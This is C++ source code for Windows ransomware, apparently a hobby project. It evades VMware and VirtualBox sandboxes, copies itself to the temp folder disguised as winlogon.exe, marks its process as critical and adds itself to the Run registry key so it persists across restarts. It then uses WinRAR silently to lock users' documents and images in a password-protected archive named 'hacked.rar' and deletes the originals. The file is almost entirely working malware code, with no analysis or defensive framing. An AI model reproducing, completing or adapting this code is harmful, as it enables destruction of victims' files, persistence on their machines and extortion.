#include <iostream>
#include <stdlib.h>     /* srand, rand */
#include <time.h>       /* time */
#include <string>
#include <Windows.h>
#include <sstream>		/* char to string */ 
#include <sys/stat.h>   /* for check if file exists */
#include "protector.h"
#include <stdlib.h>		/* for Exit() */
using namespace std;

#define DEBUG 1 //debug 1 - turn off,0 - turn on

bool fileExists(const std::string& filename);
std::string generateKey();
void antiVmware();
void antiVirtualBox();

int main(){

	if(DEBUG == 1){
	antiVmware();
	antiVirtualBox();
}
//----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	TCHAR filePath[MAX_PATH];
	TCHAR tempPath[MAX_PATH];
	GetModuleFileNameA(NULL,filePath, MAX_PATH);	// get current file path
	GetTempPathA(MAX_PATH, tempPath);	// get temp path
//----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	if(strstr(filePath, "winlogon.exe") == 0){
		strcat_s(tempPath, "\\winlogon.exe");
		CopyFile(filePath, tempPath, 1);
		Sleep(1000);
		ShellExecuteA(NULL, "open", tempPath, NULL, NULL, SW_SHOW);
		exit(EXIT_FAILURE);
	}
	// if file already in temp path
	else{
    ProtectProcess();  //make process as critical . example : winlogon.exe
	std::string password = generateKey();
	//Get username
	char user[MAX_PATH+1];
	DWORD user_len = MAX_PATH+1;
	GetUserName(user, &user_len);	 //get user name
//----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	//config
	std::string extensionList = "\"C:\\Users\\*\\*.txt\" \"C:\\Users\\*\\*.pdf\" \"C:\\Users\\*\\*.jpg\" \"C:\\Users\\*\\*.jpeg\" \"C:\\Users\\*\\*.rtf\""; //for debug
	/*std::string extensionList = "\"C:\\*\\*.txt\" \"C:\\*\\*.pdf\" \"C:\\*\\*.jpg\" \"C:\\*\\*.jpeg\" \"C:\\*\\*.rtf\"";*/
	std::string desktopPath = "C:\\Users\\" + (std::string)(user) + "\\Desktop\\";
	const std::string rarPath = "C:\\Program Files\\WinRAR\\WinRAR.exe";
	const std::string fileName = "hacked.rar";

	std::string tempName = tempPath + fileName;

	std::string desktopName = desktopPath + fileName;
	/*
	-ioff	turn off computer after finish
	-mt2	use two threads
	-inul	no debug message
	-IBCK	run silently
	-df		delete file after finish
	*/
	std::string fullCommandRar = "\"" +(std::string)rarPath + "\"" +" -mt2 a -df -IBCK -ace -p=" + password + " -m1 -logf=\"" + desktopPath + "list_crypted_file.txt\" \"" + (std::string)tempPath + fileName + "\" " + extensionList;
//----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	//put filePath to double quotes  - fullResult
	TCHAR fullResult[MAX_PATH];
	fullResult[0] = NULL;
	TCHAR fullFilePath[MAX_PATH] = "\"";
	strcat_s(fullResult, fullFilePath);
	strcat_s(fullResult, filePath);
	strcat_s(fullResult, "\"");
	//write itself to start-up by registry key 
	//std::cout << fullResult << std::endl; //debug
	HKEY hkey;
	long regOpenResult;
	regOpenResult = RegOpenKey(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	long reg = RegSetValueEx(hkey,"Success",0,REG_SZ,(BYTE*) fullResult, strlen(fullResult));
	RegCloseKey(hkey);
//----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	//check if rar exist or not
	if(fileExists(rarPath)){ 
		if(fileExists(tempName) || fileExists(desktopName)){
			MoveFile(tempName.c_str(), desktopName.c_str()); // move archived file to desktop			 
			while(true){}; //for futher develope
		}
		else{
		//std::cout << "Exist" << std::endl;
		WinExec(fullCommandRar.c_str(), 1);
		Sleep(3000000); //sleep till restast
		}
	}
	else{
		//std::cout << "Not Exist" << std::endl;
	}
		//std::system("pause");
	return 0;
	}
}



//----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
void antiVirtualBox(){
	if(fileExists("C:\\windows\\System32\\Drivers\\VBoxMouse.sys")){
		exit(EXIT_FAILURE);
	}
	else if(fileExists("C:\\windows\\System32\\Drivers\\VBoxGuest.sys")) exit(EXIT_FAILURE);
	else if(fileExists("C:\\windows\\System32\\Drivers\\VBoxSF.sys")) exit(EXIT_FAILURE);
	else if(fileExists("C:\\windows\\System32\\Drivers\\VBoxVideo.sys")) exit(EXIT_FAILURE);
	else if(fileExists("C:\\windows\\System32\\vboxdisp.dll")) exit(EXIT_FAILURE);
	else if(fileExists("C:\\windows\\System32\\vboxhook.dll")) exit(EXIT_FAILURE);
	else if(fileExists("C:\\windows\\System32\\vboxmrxnp.dll")) exit(EXIT_FAILURE);
	else if(fileExists("C:\\windows\\System32\\vboxogl.dll")) exit(EXIT_FAILURE);
	else if(fileExists("C:\\windows\\System32\\vboxoglarrayspu.dll")) exit(EXIT_FAILURE);
	else if(fileExists("C:\\windows\\System32\\vboxoglcrutil.dll")) exit(EXIT_FAILURE);
	else if(fileExists("C:\\windows\\System32\\vboxoglerrorspu.dll")) exit(EXIT_FAILURE);
	else if(fileExists("C:\\windows\\System32\\vboxoglfeedbackspu.dll")) exit(EXIT_FAILURE);
	else if(fileExists("C:\\windows\\System32\\vboxoglpackspu.dll")) exit(EXIT_FAILURE);
	else if(fileExists("C:\\windows\\System32\\vboxoglpassthroughspu.dll")) exit(EXIT_FAILURE);

}

void antiVmware(){
	if(fileExists("C:\\windows\\System32\\Drivers\\Vmmouse.sys")){
		exit(EXIT_FAILURE);
	}
	else if(fileExists("C:\\windows\\System32\\Drivers\\vm3dgl.dll")){
		exit(EXIT_FAILURE);
	}
	else if(fileExists("C:\\windows\\System32\\Drivers\\vmdum.dll")){
		exit(EXIT_FAILURE);
	}
	else if(fileExists("C:\\windows\\System32\\Drivers\\vm3dver.dll")){
		exit(EXIT_FAILURE);
	}
	else if(fileExists("C:\\windows\\System32\\Drivers\\vmtray.dll")){
		exit(EXIT_FAILURE);
	}
	else if(fileExists("C:\\windows\\System32\\Drivers\\VMToolsHook.dll")){
		exit(EXIT_FAILURE);
	}
	else if(fileExists("C:\\windows\\System32\\Drivers\\vmmousever.dll")){
		exit(EXIT_FAILURE);
	}
	else if(fileExists("C:\\windows\\System32\\Drivers\\vmhgfs.dll")){
		exit(EXIT_FAILURE);
	}
	else if(fileExists("C:\\windows\\System32\\Drivers\\vmGuestLib.dll")){
		exit(EXIT_FAILURE);
	}
	else if(fileExists("C:\\windows\\System32\\Drivers\\VmGuestLibJava.dll")){
		exit(EXIT_FAILURE);
	}
	else if(fileExists("C:\\windows\\System32\\Driversvmhgfs.dll")){
		exit(EXIT_FAILURE);
	}
}
bool fileExists(const std::string& filename)
{
	struct stat buf;
	if (stat(filename.c_str(), &buf) != -1)
	{
		return true;
	}
	return false;
}

std::string generateKey(){
	srand (time(NULL));
	int asciiNum, randomNum;
	std::string secretKey, randomNumStr, randomNumStreamStr, asciiNumStr;
	for(int i = 0; i < 16; i++){
		asciiNum = rand()%25 + 97;	// ascii character : 97 -122
		randomNum = rand()%10 + 1;
		std::stringstream ss;
		ss << (char)(asciiNum);
		ss >> asciiNumStr;
		randomNumStr = std::to_string((long double)randomNum);
		secretKey += (randomNumStr + asciiNumStr);
	}
	return secretKey;
}